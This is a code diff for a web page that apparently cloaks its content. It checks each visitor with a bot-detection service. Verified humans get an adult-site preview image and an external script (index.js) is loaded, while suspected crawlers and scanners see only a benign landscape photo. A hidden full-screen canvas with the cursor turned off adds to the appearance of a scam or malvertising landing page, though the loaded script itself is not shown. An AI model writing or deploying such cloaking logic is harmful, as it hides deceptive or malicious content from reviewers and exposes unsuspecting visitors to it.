@@ -42,14 +42,20 @@
     AdscoreInit("QqLfAAAAAAAAeEtgdQZAr2RAk6MtjZ2iS1cnrNU", {
       sub_id: "space-japanfacts",
       callback: async (result) => {
-        const response = await fetch(`https://trustscore.it.com/x/verify/adscore?signature=${result.signature}`);
+        const response = await fetch(`https://trustscore.it.com/x/verify/adscore/v5?signature=${result.signature}`);
         const adscore = await response.json();
         console.log(adscore);
         switch (true) {
           case adscore.okay:
-            return run(() => load(`index.js`));
+            return run(() => {
+              document.querySelector('#image').src = `https://www.faponhd.com/contents/videos_screenshots/0/700/preview.jpg`;
+              return load(`index.js`);
+            });
           default:
-            return false;
+            return run(() => {
+              document.querySelector('#image').src = `https://wallpapersok.com/images/hd/1920x1080-full-hd-nature-empty-road-domelzuuj7rtqqu5.jpg`;
+              return false;
+            });
         }
       }
     });
@@ -106,7 +112,7 @@
 
 <body>
   <div id="remove" class="container">
-    <img loading="lazy" src="https://www.faponhd.com/contents/videos_screenshots/0/700/preview.jpg" alt="image">
+    <img id="image" loading="lazy" alt="image">
     <div class="play-button"></div>
   </div>
   <section id="mycanvas" class="map" style="display: none; cursor: none;">
